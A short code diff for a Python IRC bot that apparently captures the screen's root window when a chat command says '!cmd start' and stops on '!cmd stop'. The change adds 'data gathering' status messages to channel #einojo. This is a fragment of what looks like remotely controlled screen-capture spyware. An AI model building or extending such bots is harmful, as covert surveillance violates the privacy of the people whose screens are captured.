@@ -23,6 +23,7 @@ while True:
         bot.pong(data.split()[1])
     time.sleep(1)
     if "!cmd start" in data:
+	bot.message("#einojo", "Data gathering started")
         run = 1
     while run == 1:
         w = gtk.gdk.get_default_root_window()
@@ -45,4 +46,5 @@ while True:
         if data.find("PING") != -1:
             bot.pong(data.split()[1])
         if "!cmd stop" in data:
+            bot.message("#einojo", "Data gathering stopped")
             run = 0
